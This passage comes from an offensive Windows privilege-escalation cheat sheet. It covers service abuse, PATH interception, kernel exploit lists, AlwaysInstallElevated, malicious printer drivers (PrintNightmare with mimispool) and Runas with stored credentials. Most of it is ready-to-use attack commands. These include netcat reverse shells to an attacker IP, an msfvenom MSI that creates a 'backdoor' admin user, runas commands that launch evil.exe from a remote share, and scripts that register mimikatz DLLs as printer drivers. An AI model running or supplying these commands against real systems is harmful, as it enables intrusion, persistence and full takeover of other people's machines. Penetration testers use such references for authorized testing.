</span></span><span style=display:flex><span>Path          <span style=color:#960050;background-color:#1e0010>:</span> C:\Program Files\Microsoft\Bing Bar\<span style=color:#ae81ff>7.1</span>\BBSvc.exe
</span></span><span style=display:flex><span>StartName     <span style=color:#960050;background-color:#1e0010>:</span> LocalSystem
</span></span><span style=display:flex><span>AbuseFunction <span style=color:#960050;background-color:#1e0010>:</span> Write-ServiceBinary -ServiceName <span style=color:#e6db74>&#39;BBSvc&#39;</span> -Path &lt;HijackPath&gt;
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># automatic exploit</span>
</span></span><span style=display:flex><span>Invoke-ServiceAbuse -Name [<span style=color:#66d9ef>SERVICE_NAME</span>] -Command <span style=color:#e6db74>&#34;..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe&#34;</span>
</span></span></code></pre></div></li></ul><h3 id=example>Example
<a class=anchor href=#example>#</a></h3><p>For <code>C:\Program Files\something\legit.exe</code>, Windows will try the following paths first:</p><ul><li><code>C:\Program.exe</code></li><li><code>C:\Program Files.exe</code></li></ul><h2 id=eop---path-interception>EoP - $PATH Interception
<a class=anchor href=#eop---path-interception>#</a></h2><p>Requirements:</p><ul><li>PATH contains a writeable folder with low privileges.</li><li>The writeable folder is <em>before</em> the folder that contains the legitimate binary.</li></ul><p>EXAMPLE:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># List contents of the PATH environment variable</span>
</span></span><span style=display:flex><span><span style=color:#75715e># EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32</span>
</span></span><span style=display:flex><span>$env:Path
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># See permissions of the target folder</span>
</span></span><span style=display:flex><span><span style=color:#75715e># EXAMPLE OUTPUT: BUILTIN\Users: GR,GW</span>
</span></span><span style=display:flex><span>icacls.exe <span style=color:#e6db74>&#34;C:\Program Files\nodejs\&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Place our evil-file in that folder.</span>
</span></span><span style=display:flex><span>copy evil-file.exe <span style=color:#e6db74>&#34;C:\Program Files\nodejs\cmd.exe&#34;</span>
</span></span></code></pre></div><p>Because (in this example) &ldquo;C:\Program Files\nodejs" is <em>before</em> &ldquo;C:\WINDOWS\system32" on the PATH variable, the next time the user runs &ldquo;cmd.exe&rdquo;, our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder.</p><h2 id=eop---named-pipes>EoP - Named Pipes
<a class=anchor href=#eop---named-pipes>#</a></h2><ol><li>Find named pipes: <code>[System.IO.Directory]::GetFiles("\\.\pipe\")</code></li><li>Check named pipes DACL: <code>pipesec.exe &lt;named_pipe></code></li><li>Reverse engineering software</li><li>Send data throught the named pipe : <code>program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe</code></li></ol><h2 id=eop---kernel-exploitation>EoP - Kernel Exploitation
<a class=anchor href=#eop---kernel-exploitation>#</a></h2><p>List of exploits kernel : <a href=https://github.com/SecWiki/windows-kernel-exploits>https://github.com/SecWiki/windows-kernel-exploits</a></p><h5 id=security-bulletinnbspnbspnbspkb-nbspnbspnbspnbspdescriptionnbspnbspnbspnbspoperating-system>#Security BulletinÂ Â Â #KB Â Â Â Â #DescriptionÂ Â Â Â #Operating System
<a class=anchor href=#security-bulletinnbspnbspnbspkb-nbspnbspnbspnbspdescriptionnbspnbspnbspnbspoperating-system>#</a></h5><ul><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-017>MS17-017</a> ã€€[KB4013081]ã€€ã€€[GDI Palette Objects Local Privilege Escalation]ã€€ã€€(windows 7/8)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-8464>CVE-2017-8464</a> ã€€[LNK Remote Code Execution Vulnerability]ã€€ã€€(windows 10/8.1/7/2016/2010/2008)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213>CVE-2017-0213</a> ã€€[Windows COM Elevation of Privilege Vulnerability]ã€€ã€€(windows 10/8.1/7/2016/2010/2008)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-0833>CVE-2018-0833</a> [SMBv3 Null Pointer Dereference Denial of Service] (Windows 8.1/Server 2012 R2)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120>CVE-2018-8120</a> [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-010>MS17-010</a> ã€€[KB4013389]ã€€ã€€[Windows Kernel Mode Drivers]ã€€ã€€(windows 7/2008/2003/XP)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135>MS16-135</a> ã€€[KB3199135]ã€€ã€€[Windows Kernel Mode Drivers]ã€€ã€€(2016)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-111>MS16-111</a> ã€€[KB3186973]ã€€ã€€[kernel api]ã€€ã€€(Windows 10 10586 (32/64)/8.1)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098>MS16-098</a> ã€€[KB3178466]ã€€ã€€[Kernel Driver]ã€€ã€€(Win 8.1)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075>MS16-075</a> ã€€[KB3164038]ã€€ã€€[Hot Potato]ã€€ã€€(2003/2008/7/8/2012)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034>MS16-034</a> ã€€[KB3143145]ã€€ã€€[Kernel Driver]ã€€ã€€(2008/7/8/10/2012)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032>MS16-032</a> ã€€[KB3143141]ã€€ã€€[Secondary Logon Handle]ã€€ã€€(2008/7/8/10/2012)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-016>MS16-016</a> ã€€[KB3136041]ã€€ã€€[WebDAV]ã€€ã€€(2008/Vista/7)</li><li><a href=https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014>MS16-014</a> ã€€[K3134228]ã€€ã€€[remote code execution]ã€€ã€€(2008/Vista/7)<br>&mldr;</li><li><a href=./MS03-026>MS03-026</a> ã€€[KB823980]ã€€ã€€ [Buffer Overrun In RPC Interface]ã€€ã€€(/NT/2000/XP/2003)</li></ul><p>To cross compile a program from Kali, use the following command.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Kali&gt; i586-mingw32msvc-gcc -o adduser.exe useradd.c
</span></span></code></pre></div><h2 id=eop---alwaysinstallelevated>EoP - AlwaysInstallElevated
<a class=anchor href=#eop---alwaysinstallelevated>#</a></h2><p>Check if these registry values are set to &ldquo;1&rdquo;.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</span></span><span style=display:flex><span>$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
</span></span><span style=display:flex><span>$ Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
</span></span></code></pre></div><p>Then create an MSI package and install it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 <span style=color:#f92672>-f</span> msi -o evil.msi
</span></span><span style=display:flex><span>$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 <span style=color:#f92672>-f</span> msi-nouac -o evil.msi
</span></span><span style=display:flex><span>$ msiexec /quiet /qn /i C:\evil.msi
</span></span></code></pre></div><p>Technique also available in :</p><ul><li>Metasploit : <code>exploit/windows/local/always_install_elevated</code></li><li>PowerUp.ps1 : <code>Get-RegistryAlwaysInstallElevated</code>, <code>Write-UserAddMSI</code></li></ul><h2 id=eop---insecure-gui-apps>EoP - Insecure GUI apps
<a class=anchor href=#eop---insecure-gui-apps>#</a></h2><p>Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.</p><p>Example: &ldquo;Windows Help and Support&rdquo; (Windows + F1), search for &ldquo;command prompt&rdquo;, click on &ldquo;Click to open Command Prompt&rdquo;</p><h2 id=eop---evaluating-vulnerable-drivers>EoP - Evaluating Vulnerable Drivers
<a class=anchor href=#eop---evaluating-vulnerable-drivers>#</a></h2><p>Look for vuln drivers loaded, we often don&rsquo;t spend enough time looking at this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Native binary</span>
</span></span><span style=display:flex><span>PS C:\Users\Swissky&gt; driverquery.exe /fo table /si
</span></span><span style=display:flex><span>Module Name  Display Name           Driver Type   Link Date
</span></span><span style=display:flex><span>============ ====================== ============= ======================
</span></span><span style=display:flex><span>1394ohci     <span style=color:#ae81ff>1394</span> OHCI Compliant Ho Kernel        <span style=color:#ae81ff>12</span>/<span style=color:#ae81ff>10</span>/<span style=color:#ae81ff>2006</span> <span style=color:#ae81ff>4</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>44</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>38</span> PM
</span></span><span style=display:flex><span>3ware        3ware                  Kernel        <span style=color:#ae81ff>5</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>2015</span> <span style=color:#ae81ff>6</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>28</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>03</span> PM
</span></span><span style=display:flex><span>ACPI         Microsoft ACPI Driver  Kernel        <span style=color:#ae81ff>12</span>/<span style=color:#ae81ff>9</span>/<span style=color:#ae81ff>1975</span> <span style=color:#ae81ff>6</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>17</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>08</span> AM
</span></span><span style=display:flex><span>AcpiDev      ACPI Devices driver    Kernel        <span style=color:#ae81ff>12</span>/<span style=color:#ae81ff>7</span>/<span style=color:#ae81ff>1993</span> <span style=color:#ae81ff>6</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>22</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>19</span> AM
</span></span><span style=display:flex><span>acpiex       Microsoft ACPIEx Drive Kernel        <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>1</span>/<span style=color:#ae81ff>2087</span> <span style=color:#ae81ff>8</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>53</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>50</span> AM
</span></span><span style=display:flex><span>acpipagr     ACPI Processor Aggrega Kernel        <span style=color:#ae81ff>1</span>/<span style=color:#ae81ff>24</span>/<span style=color:#ae81ff>2081</span> <span style=color:#ae81ff>8</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>36</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>36</span> AM
</span></span><span style=display:flex><span>AcpiPmi      ACPI Power Meter Drive Kernel        <span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>19</span>/<span style=color:#ae81ff>2006</span> <span style=color:#ae81ff>9</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>20</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>15</span> PM
</span></span><span style=display:flex><span>acpitime     ACPI Wake Alarm Driver Kernel        <span style=color:#ae81ff>2</span>/<span style=color:#ae81ff>9</span>/<span style=color:#ae81ff>1974</span> <span style=color:#ae81ff>7</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>30</span> AM
</span></span><span style=display:flex><span>ADP80XX      ADP80XX                Kernel        <span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>9</span>/<span style=color:#ae81ff>2015</span> <span style=color:#ae81ff>4</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>49</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>48</span> PM
</span></span><span style=display:flex><span>&lt;SNIP&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery</span>
</span></span><span style=display:flex><span>PS C:\Users\Swissky&gt; DriverQuery.exe --no-msft
</span></span><span style=display:flex><span>[+] Enumerating driver services...
</span></span><span style=display:flex><span>[+] Checking file signatures...
</span></span><span style=display:flex><span>Citrix USB <span style=color:#66d9ef>Filter</span> Driver
</span></span><span style=display:flex><span>    Service Name<span style=color:#960050;background-color:#1e0010>:</span> ctxusbm
</span></span><span style=display:flex><span>    Path<span style=color:#960050;background-color:#1e0010>:</span> C:\Windows\system32\DRIVERS\ctxusbm.sys
</span></span><span style=display:flex><span>    Version<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>14.11</span>.0.138
</span></span><span style=display:flex><span>    Creation Time (UTC)<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>17</span>/<span style=color:#ae81ff>05</span>/<span style=color:#ae81ff>2018</span> <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>20</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span>    Cert Issuer<span style=color:#960050;background-color:#1e0010>:</span> CN=Symantec <span style=color:#66d9ef>Class</span> 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US
</span></span><span style=display:flex><span>    Signer<span style=color:#960050;background-color:#1e0010>:</span> CN=<span style=color:#e6db74>&#34;Citrix Systems, Inc.&#34;</span>, OU=XenApp(ClientSHA256), O=<span style=color:#e6db74>&#34;Citrix Systems, Inc.&#34;</span>, L=Fort Lauderdale, S=Florida, C=US
</span></span><span style=display:flex><span>&lt;SNIP&gt;
</span></span></code></pre></div><h2 id=eop---printers>EoP - Printers
<a class=anchor href=#eop---printers>#</a></h2><h3 id=universal-printer>Universal Printer
<a class=anchor href=#universal-printer>#</a></h3><p>Create a Printer</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>$printerName     = <span style=color:#e6db74>&#39;Universal Priv Printer&#39;</span>
</span></span><span style=display:flex><span>$system32        = $env:systemroot + <span style=color:#e6db74>&#39;\system32&#39;</span>
</span></span><span style=display:flex><span>$drivers         = $system32 + <span style=color:#e6db74>&#39;\spool\drivers&#39;</span>
</span></span><span style=display:flex><span>$RegStartPrinter = <span style=color:#e6db74>&#39;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\&#39;</span> + $printerName
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>Copy-Item -Force -Path ($system32 + <span style=color:#e6db74>&#39;\mscms.dll&#39;</span>)             -Destination ($system32 + <span style=color:#e6db74>&#39;\mimispool.dll&#39;</span>)
</span></span><span style=display:flex><span>Copy-Item -Force -Path <span style=color:#e6db74>&#39;.\mimikatz_trunk\x64\mimispool.dll&#39;</span>   -Destination ($drivers  + <span style=color:#e6db74>&#39;\x64\3\mimispool.dll&#39;</span>)
</span></span><span style=display:flex><span>Copy-Item -Force -Path <span style=color:#e6db74>&#39;.\mimikatz_trunk\win32\mimispool.dll&#39;</span> -Destination ($drivers  + <span style=color:#e6db74>&#39;\W32X86\3\mimispool.dll&#39;</span>)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>Add-PrinterDriver -Name       <span style=color:#e6db74>&#39;Generic / Text Only&#39;</span>
</span></span><span style=display:flex><span>Add-Printer       -DriverName <span style=color:#e6db74>&#39;Generic / Text Only&#39;</span> -Name $printerName -PortName <span style=color:#e6db74>&#39;FILE:&#39;</span> -Shared
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>New-Item         -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles&#39;</span>)        | Out-Null
</span></span><span style=display:flex><span>New-Item         -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Kiwi&#39;</span>)   | Out-Null
</span></span><span style=display:flex><span>New-ItemProperty -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Kiwi&#39;</span>)   -Name <span style=color:#e6db74>&#39;Directory&#39;</span> -PropertyType <span style=color:#e6db74>&#39;String&#39;</span>      -Value <span style=color:#e6db74>&#39;x64\3&#39;</span>           | Out-Null
</span></span><span style=display:flex><span>New-ItemProperty -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Kiwi&#39;</span>)   -Name <span style=color:#e6db74>&#39;Files&#39;</span>     -PropertyType <span style=color:#e6db74>&#39;MultiString&#39;</span> -Value (<span style=color:#e6db74>&#39;mimispool.dll&#39;</span>) | Out-Null
</span></span><span style=display:flex><span>New-ItemProperty -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Kiwi&#39;</span>)   -Name <span style=color:#e6db74>&#39;Module&#39;</span>    -PropertyType <span style=color:#e6db74>&#39;String&#39;</span>      -Value <span style=color:#e6db74>&#39;mscms.dll&#39;</span>       | Out-Null
</span></span><span style=display:flex><span>New-Item         -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Litchi&#39;</span>) | Out-Null
</span></span><span style=display:flex><span>New-ItemProperty -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Litchi&#39;</span>) -Name <span style=color:#e6db74>&#39;Directory&#39;</span> -PropertyType <span style=color:#e6db74>&#39;String&#39;</span>      -Value <span style=color:#e6db74>&#39;W32X86\3&#39;</span>        | Out-Null
</span></span><span style=display:flex><span>New-ItemProperty -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Litchi&#39;</span>) -Name <span style=color:#e6db74>&#39;Files&#39;</span>     -PropertyType <span style=color:#e6db74>&#39;MultiString&#39;</span> -Value (<span style=color:#e6db74>&#39;mimispool.dll&#39;</span>) | Out-Null
</span></span><span style=display:flex><span>New-ItemProperty -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Litchi&#39;</span>) -Name <span style=color:#e6db74>&#39;Module&#39;</span>    -PropertyType <span style=color:#e6db74>&#39;String&#39;</span>      -Value <span style=color:#e6db74>&#39;mscms.dll&#39;</span>       | Out-Null
</span></span><span style=display:flex><span>New-Item         -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Mango&#39;</span>)  | Out-Null
</span></span><span style=display:flex><span>New-ItemProperty -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Mango&#39;</span>)  -Name <span style=color:#e6db74>&#39;Directory&#39;</span> -PropertyType <span style=color:#e6db74>&#39;String&#39;</span>      -Value $null             | Out-Null
</span></span><span style=display:flex><span>New-ItemProperty -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Mango&#39;</span>)  -Name <span style=color:#e6db74>&#39;Files&#39;</span>     -PropertyType <span style=color:#e6db74>&#39;MultiString&#39;</span> -Value $null             | Out-Null
</span></span><span style=display:flex><span>New-ItemProperty -Path ($RegStartPrinter + <span style=color:#e6db74>&#39;\CopyFiles\Mango&#39;</span>)  -Name <span style=color:#e6db74>&#39;Module&#39;</span>    -PropertyType <span style=color:#e6db74>&#39;String&#39;</span>      -Value <span style=color:#e6db74>&#39;mimispool.dll&#39;</span>   | Out-Null
</span></span></code></pre></div><p>Execute the driver</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>$serverName  = <span style=color:#e6db74>&#39;dc.purple.lab&#39;</span>
</span></span><span style=display:flex><span>$printerName = <span style=color:#e6db74>&#39;Universal Priv Printer&#39;</span>
</span></span><span style=display:flex><span>$fullprinterName = <span style=color:#e6db74>&#39;\\&#39;</span> + $serverName + <span style=color:#e6db74>&#39;\&#39;</span> + $printerName + <span style=color:#e6db74>&#39; - &#39;</span> + $(<span style=color:#66d9ef>If</span> ([<span style=color:#66d9ef>System.Environment</span>]::Is64BitOperatingSystem) {<span style=color:#e6db74>&#39;x64&#39;</span>} <span style=color:#66d9ef>Else</span> {<span style=color:#e6db74>&#39;x86&#39;</span>})
</span></span><span style=display:flex><span>Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
</span></span><span style=display:flex><span>Add-Printer -ConnectionName $fullprinterName
</span></span></code></pre></div><h3 id=printernightmare>PrinterNightmare
<a class=anchor href=#printernightmare>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>git clone https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/Flangvik/DeployPrinterNightmare
</span></span><span style=display:flex><span>PS C:\adversary&gt; FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
</span></span><span style=display:flex><span>[&lt;<span style=color:#ae81ff>3</span>] @Flangvik - TrustedSec
</span></span><span style=display:flex><span>[+] Copying C:\Windows\system32\mscms.dll to C:\Windows\system32\6cfbaf26f4c64131896df8a522546e9c.dll
</span></span><span style=display:flex><span>[+] Copying 64mimispool.dll to C:\Windows\system32\spool\drivers\x64\<span style=color:#ae81ff>3</span>\6cfbaf26f4c64131896df8a522546e9c.dll
</span></span><span style=display:flex><span>[+] Copying 32mimispool.dll to C:\Windows\system32\spool\drivers\W32X86\<span style=color:#ae81ff>3</span>\6cfbaf26f4c64131896df8a522546e9c.dll
</span></span><span style=display:flex><span>[+] Adding printer driver =&gt; Generic / Text Only!
</span></span><span style=display:flex><span>[+] Adding printer =&gt; EasySystemShell!
</span></span><span style=display:flex><span>[+] Setting <span style=color:#ae81ff>64</span>-bit Registry key
</span></span><span style=display:flex><span>[+] Setting <span style=color:#ae81ff>32</span>-bit Registry key
</span></span><span style=display:flex><span>[+] Setting <span style=color:#e6db74>&#39;*&#39;</span> Registry key
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>PS C:\target&gt; $serverName  = <span style=color:#e6db74>&#39;printer-installed-host&#39;</span>
</span></span><span style=display:flex><span>PS C:\target&gt; $printerName = <span style=color:#e6db74>&#39;EasySystemShell&#39;</span>
</span></span><span style=display:flex><span>PS C:\target&gt; $fullprinterName = <span style=color:#e6db74>&#39;\\&#39;</span> + $serverName + <span style=color:#e6db74>&#39;\&#39;</span> + $printerName + <span style=color:#e6db74>&#39; - &#39;</span> + $(<span style=color:#66d9ef>If</span> ([<span style=color:#66d9ef>System.Environment</span>]::Is64BitOperatingSystem) {<span style=color:#e6db74>&#39;x64&#39;</span>} <span style=color:#66d9ef>Else</span> {<span style=color:#e6db74>&#39;x86&#39;</span>})
</span></span><span style=display:flex><span>PS C:\target&gt; Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
</span></span><span style=display:flex><span>PS C:\target&gt; Add-Printer -ConnectionName $fullprinterName
</span></span></code></pre></div><h3 id=bring-your-own-vulnerability>Bring Your Own Vulnerability
<a class=anchor href=#bring-your-own-vulnerability>#</a></h3><p>Concealed Position : <a href=https://github.com/jacob-baines/concealed_position>https://github.com/jacob-baines/concealed_position</a></p><ul><li>ACIDDAMAGE - <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-35449>CVE-2021-35449</a> - Lexmark Universal Print Driver LPE</li><li>RADIANTDAMAGE - <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-38085>CVE-2021-38085</a> - Canon TR150 Print Driver LPE</li><li>POISONDAMAGE - <a href=https://nvd.nist.gov/vuln/detail/CVE-2019-19363>CVE-2019-19363</a> - Ricoh PCL6 Print Driver LPE</li><li>SLASHINGDAMAGE - <a href=https://nvd.nist.gov/vuln/detail/CVE-2020-1300>CVE-2020-1300</a> - Windows Print Spooler LPE</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>cp_server.exe -e ACIDDAMAGE
</span></span><span style=display:flex><span><span style=color:#75715e># Get-Printer</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Set the &#34;Advanced Sharing Settings&#34; -&gt; &#34;Turn off password protected sharing&#34;</span>
</span></span><span style=display:flex><span>cp_client.exe -r <span style=color:#ae81ff>10.0</span>.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
</span></span><span style=display:flex><span>cp_client.exe -l -e ACIDDAMAGE
</span></span></code></pre></div><h2 id=eop---runas>EoP - Runas
<a class=anchor href=#eop---runas>#</a></h2><p>Use the <code>cmdkey</code> to list the stored credentials on the machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>cmdkey /list
</span></span><span style=display:flex><span>Currently stored credentials<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span> Target<span style=color:#960050;background-color:#1e0010>:</span> Domain<span style=color:#960050;background-color:#1e0010>:</span>interactive=WORKGROUP\Administrator
</span></span><span style=display:flex><span> Type<span style=color:#960050;background-color:#1e0010>:</span> Domain Password
</span></span><span style=display:flex><span> User<span style=color:#960050;background-color:#1e0010>:</span> WORKGROUP\Administrator
</span></span></code></pre></div><p>Then you can use <code>runas</code> with the <code>/savecred</code> options in order to use the saved credentials.
The following example is calling a remote binary via an SMB share.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>runas /savecred /user<span style=color:#960050;background-color:#1e0010>:</span>WORKGROUP\Administrator <span style=color:#e6db74>&#34;\\10.XXX.XXX.XXX\SHARE\evil.exe&#34;</span>
</span></span><span style=display:flex><span>runas /savecred /user<span style=color:#960050;background-color:#1e0010>:</span>Administrator <span style=color:#e6db74>&#34;cmd.exe /k whoami&#34;</span>
</span></span></code></pre></div><p>Using <code>runas</code> with a provided set of credential.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Windows\System32\runas.exe /env /noprofile /user<span style=color:#960050;background-color:#1e0010>:</span>&lt;username&gt; &lt;password&gt; <span style=color:#e6db74>&#34;c:\users\Public\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$secpasswd = ConvertTo-SecureString <span style=color:#e6db74>&#34;&lt;password&gt;&#34;</span> -AsPlainText -Force
</span></span><span style=display:flex><span>$mycreds = New-Object System.Management.Automation.PSCredential (<span style=color:#e6db74>&#34;&lt;user&gt;&#34;</span>, $secpasswd)
</span></span><span style=display:flex><span>$computer = <span style=color:#e6db74>&#34;&lt;hostname&gt;&#34;</span>
</span></span><span style=display:flex><span>[<span style=color:#66d9ef>System.Diagnostics.Process</span>]::Start(<span style=color:#e6db74>&#34;C:\users\public\nc.exe&#34;</span>,<span style=color:#e6db74>&#34;&lt;attacker_ip&gt; 4444 -e cmd.exe&#34;</span>, $mycreds.Username, $mycreds.Password, $computer)
</span></span></code></pre></div><h2 id=eop---abusing-shadow-copies>EoP - Abusing Shadow Copies
<a class=anchor href=#eop---abusing-shadow-copies>#</a></h2><p>If you have local administrator access on a machine try to list shadow copies, it&rsquo;s an easy way for Privilege Escalation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># List shadow copies using vssadmin (Needs Admnistrator Access)</span>
</span></span><span style=display:flex><span>vssadmin list shadows
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#75715e># List shadow copies using diskshadow</span>
</span></span><span style=display:flex><span>diskshadow list shadows all
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#75715e># Make a symlink to the shadow copy and access it</span>
</span></span><span style=display:flex><span>mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
